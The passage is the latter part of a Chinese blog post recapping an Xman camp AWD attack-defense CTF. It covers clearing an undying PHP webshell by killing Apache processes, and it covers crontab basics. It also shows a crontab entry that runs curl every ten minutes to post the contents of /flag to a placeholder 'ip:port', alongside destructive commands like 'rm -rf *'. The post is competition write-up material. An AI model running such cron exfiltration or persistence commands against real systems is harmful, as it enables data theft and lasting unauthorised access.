<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm ./-config.php</span><br><span class="line">rm -- -config.php</span><br><span class="line"># 如果只有一个文件</span><br><span class="line">rm -rf *</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20190822192005.png" alt></p>
<p>然后就是马的主体部分, 死循环不断生成文件, 单纯删掉文件没有用, 还是会生成, 而且此时php文件已经写到内存里面了, 我们可以这么杀马</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm .config.php && mkdir .config.php</span><br><span class="line">killall <span class="hljs-number">-9</span> apache2</span><br><span class="line"><span class="hljs-comment"># 或者</span></span><br><span class="line">killall <span class="hljs-number">-9</span> -u www-data</span><br><span class="line">rm -rf .config.php</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>通过新建文件夹让程序无法继续写马, 然后再杀掉进程, 删了文件夹就可以了</p>
<p>这只是最基础的内存马, 还有各种花哨的马, 比如几个马相互守护, 定时任务马等等, 删除的方法都差不多, 无非都是想办法杀进程建文件夹来让马失效, 还听说过区块链马, 可以让中马的机器变成一群肉机, 利用他们来进行攻击等等.</p>
<h3 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h3><p>定时任务的语法可以参考<a href="https://www.runoob.com/linux/linux-comm-crontab.html" target="_blank" rel="noopener">https://www.runoob.com/linux/linux-comm-crontab.html</a></p>
<p>大体就是前面分别表示 分 时 日 月 年 , /后表示每多久执行一次,例如下面的命令就是每十分钟执行一次</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/10 * * * * command</span><br></pre></td></tr></tbody></table></figure><p></p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># list</span><br><span class="line">crontab -l</span><br><span class="line"># 删除</span><br><span class="line">crontab -r</span><br><span class="line"># submit flag</span><br><span class="line">echo "*/10 * * * * curl ip:port/submit_flag/ -d 'flag='$(/bin/cat /flag)'&token=xxxx'" |crontab</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>比赛中可以用来写crontab定时getflag, 删除则是<code>crontab -r</code>, 如果是循环写入的, 就得写个循环删, 或者先杀马再删, 一般来说都是结合不死马一起打的组合拳</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次比赛准备还是不足, 罗列一下大概如下</p>
<ul>
<li>没有使用框架, 只是简单的<code>cat /flag</code> , 不能持续输出, 如果别人补了洞就打不了</li>
<li>没有准备好垃圾流量脚本, payload赤裸裸的打出去, 别人抄作业也抄的快, 打了几轮得分就慢慢变少了</li>
<li>备份不够熟练, 原来的备份命令写的有点问题, 导致备份有点慢, 也忘记备份数据库了, 有一道题全程宕机</li>
<li>check写的不好, 只是简单的检查了一下页面, 没有检查页面的内容和数据库的状态, 对选择的cms不熟, 有个洞的exp一直打不出去</li>
</ul>
<p>总体来说也还好, 队友@Cosmos把自己出的题打了3k分, 权限维持做的不错, 基本从早打到晚, 不过中间好像脚本出了问题, 有一段时间flag打了没交上去, 导致中间没得分, 还是比较亏的, 我抄了几波作业也打的挺快乐</p>
<p>@q4n师傅一个人运维6道pwn题还打了不少输出, 必须膜一波</p>
<p>Xman结束, 接下来就是回归Kap0k了, 希望大三这一年, 能像@C0mRaDe大哥一样做一个真正的web手</p>
<p>最后, 感谢Tea deliverer的@王郁师傅做的AWD分享, 收获很大, 衷心感谢.</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://edwardchoijc.github.io/CTF%E7%BA%BF%E4%B8%8BAWD%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93.html" target="_blank" rel="noopener">edward- ctf线下赛经验总结</a></p>
<p><a href="https://zeroyu.xyz/2018/05/24/ctf-awd-note/" target="_blank" rel="noopener">zeroyu-ctf awd模式攻防note</a></p>
<p><a href="https://blog.csdn.net/Nothwest__Green/article/details/83868606" target="_blank" rel="noopener">1cePeak-CTF-线下AWD-py脚本</a></p>
<p><a href="https://www.freebuf.com/articles/network/201222.html" target="_blank" rel="noopener">LiN3ver5ec-聊聊AWD攻防赛流程及准备经验</a></p>
<p><br></p><blockquote class="colorquote info"><p>本文作者: cjm00n<br>本文地址: <a href="https://cjm00n.top/2019/08/22/Xman结营赛AWD总结/">https://cjm00n.top/2019/08/22/Xman结营赛AWD总结/</a> <br>版权声明: 除特别说明外，所有文章均采用 CC BY 4.0 许可协议，转载请先取得同意。</p>
</blockquote><p></p>
</body></html>
        
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
        
        <span class="column is-narrow"><a class="tag is-light article-tag"
                href="/tags/AWD/"><i class="far fa-bookmark"></i>&nbsp;&nbsp;AWD</a></span>
        
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2019/10/24/Config%E6%96%87%E6%A1%A3/">Config文档</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-next">
            
        </span>
    </div>
    
</article>




<div class="comments">
    <h3 class="title is-4">评论</h3>
    
<script>
    function loadDisqus(){
    var disqus_config = function () {
        this.page.url = 'https://cjm00n.top/2019/08/22/Xman%E7%BB%93%E8%90%A5%E8%B5%9BAWD%E6%80%BB%E7%BB%93/';
        this.page.identifier = '2019/08/22/Xman结营赛AWD总结/';
        
        this.language = 'zh';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.async = true;
        s.src = '//' + 'cjm00n' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
}
    // 通过检查 window 对象确认是否在浏览器中运行
var runningOnBrowser = typeof window !== "undefined";
// 通过检查 scroll 事件 API 和 User-Agent 来匹配爬虫
var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
// 检查当前浏览器是否支持 IntersectionObserver API
var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;

// 一个小 hack，将耗时任务包裹在 setTimeout(() => { }, 1) 中，可以推迟到 Event Loop 的任务队列中、等待主调用栈清空后才执行，在绝大部分浏览器中都有效
// 其实这个 hack 本来是用于优化骨架屏显示的。一些浏览器总是等 JavaScript 执行完了才开始页面渲染，导致骨架屏起不到降低 FCP 的优化效果，所以通过 hack 将耗时函数放到骨架屏渲染完成后再进行。
setTimeout(function () {
  if (!isBot && supportsIntersectionObserver) {
    // 当前环境不是爬虫、并且浏览器兼容 IntersectionObserver API
    var disqus_observer = new IntersectionObserver(function(entries) {
      // 当前视窗中已出现 Disqus 评论框所在位置
      if (entries[0].isIntersecting) {
        // 加载 Disqus
        loadDisqus();
        // 停止当前的 Observer
        disqus_observer.disconnect();
      }
    }, { threshold: [0] });
    // 设置让 Observer 观察 #disqus_thread 元素
    disqus_observer.observe(document.getElementById('disqus_thread'));
  } else {
    // 当前环境是爬虫、或当前浏览器其不兼容 IntersectionObserver API
    // 直接加载 Disqus
    loadDisqus();
  }
}, 1);
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                <i class="fas fa-copyright" ></i> 2020 cjM00N&nbsp;
                Powered by <a href="https://hexo.io/" target="_blank"><i class="fab fa-github-alt" style="color:black"></i>&nbsp;Hexo</a>&nbsp;&&nbsp;<a
                href="https://github.com/ppoffice/hexo-theme-minos"><i class="fas fa-blog" style="color: black;"></i>&nbsp;Minos</a>
                        
            </div>
            <div class="column is-hidden-mobile"></div>
            
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.24.0/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/" target="_blank" rel="noopener">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    // moment.locale("zh-CN");
    moment.locale("zh-CN");
</script>


    
    
    
    
    
    
    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.6/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="站内搜索" />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: '文章',
                PAGES: '页面',
                CATEGORIES: '分类',
                TAGS: '标签',
                UNTITLED: '(无标题)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>